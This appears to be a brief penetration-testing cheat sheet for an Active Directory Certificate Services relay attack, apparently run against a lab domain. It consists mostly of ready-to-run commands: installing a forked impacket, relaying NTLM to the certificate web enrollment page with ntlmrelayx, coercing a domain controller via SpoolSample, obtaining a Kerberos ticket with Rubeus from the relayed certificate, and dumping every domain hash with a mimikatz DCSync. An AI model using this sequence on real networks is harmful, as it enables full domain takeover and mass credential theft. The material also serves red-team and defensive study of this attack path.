ADCS PWN  
=================  

Info & Links  
https://posts.specterops.io/certified-pre-owned-d95910965cd2
https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/
https://github.com/leechristensen/SpoolSample
https://github.com/GhostPack/Rubeus

How to

Prep
```
pip3 uninstall impacket
git clone --branch ADCS-PWN https://github.com/LuemmelSec/impacket 
cd impacket
python3 -m pip install .
```

Exploit

On Kali
```
python3 ntlmrelayx.py -t http://10.55.0.2/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

On Domain joined machine
```
.\SpoolSample.exe 10.55.0.1 10.55.0.30
```

On Attacker Windows or whereever we can run Rubeus
```
Rubeus.exe asktgt /user:dc2016$ /ptt /dc:10.55.0.1 /domain:mcafeelab.local /certificate:BASE64 Blob from ntlmrelayx
mimikatz.exe
lsadump::dcsync /domain:mcafeelab.local /all /csv
```
